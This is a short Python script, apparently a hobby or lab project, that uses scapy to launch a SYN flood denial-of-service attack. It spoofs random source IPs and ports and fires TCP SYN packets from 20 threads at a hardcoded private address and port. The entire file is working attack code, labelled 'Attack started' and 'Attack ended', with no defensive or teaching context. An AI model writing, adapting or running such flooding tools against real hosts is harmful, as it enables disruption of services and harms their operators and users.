from time import sleep
from scapy.all import *
from scapy.all import TCP, IP
import threading

## sender port should be random or should user set port ?

def syn_flood_packet(target_ip,target_port):
        s_addr = RandIP()   
        s_port = RandShort()
        sr(IP(src= s_addr, dst= target_ip)/ TCP(sport = s_port, dport=target_port, seq= 1505066, flags="S"),timeout=0.1, verbose=1)
     
    
       

if __name__ == '__main__':

    #target_ip = input("Please enter target ip: ")
    #target_port = input("Please enter target port: ")
    target_ip = "192.168.0.31"
    target_port = 5357
    print("Attacked host: " + str(target_ip) + "\nAttacked port: " + str(target_port))
    print("Attack started")   
    
    ## add button start/stop
    ## start begins thread that runs syn_flood_attack
    ## stop kills syn_flood_attack

    threads = []


    for i in range(0,20):
        thread = threading.Thread(target = syn_flood_packet,args = [str(target_ip),target_port])
        sleep(0.2)
        thread.start()
        threads.append(thread)
 
    for t in threads:
        t.join()

    print("Attack ended")